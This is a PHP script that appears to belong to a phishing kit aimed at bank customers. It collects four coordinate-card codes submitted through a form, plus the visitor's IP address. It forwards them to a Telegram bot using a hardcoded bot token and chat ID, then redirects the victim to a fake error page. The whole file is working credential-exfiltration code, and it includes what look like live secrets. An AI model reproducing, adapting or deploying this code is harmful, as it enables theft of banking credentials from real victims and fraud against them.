<?php
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];

////////////////////


////////////////////

if ( isset ($_POST['code12']) && isset ($_POST['code22']) && isset ($_POST['code32']) && isset ($_POST['code42']) ){

$message = ".:::Cordenadas#2:::.\r\n31: ".$_POST['code12']."\r\n16: ".$_POST['code22']."\r\n27: ".$_POST['code32']."\r\n11: ".$_POST['code42']."\r\n".$userp."";
  
$apiToken = "5984973262:AAHOKiUoO1lwfgX1BPVBLTsWTa-S_ntHMS8";


$data = [
  'chat_id' => "5512074919",

   'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

@header('Location: error403.html');

}else{ header ('location: index.html'); exit(); }

?>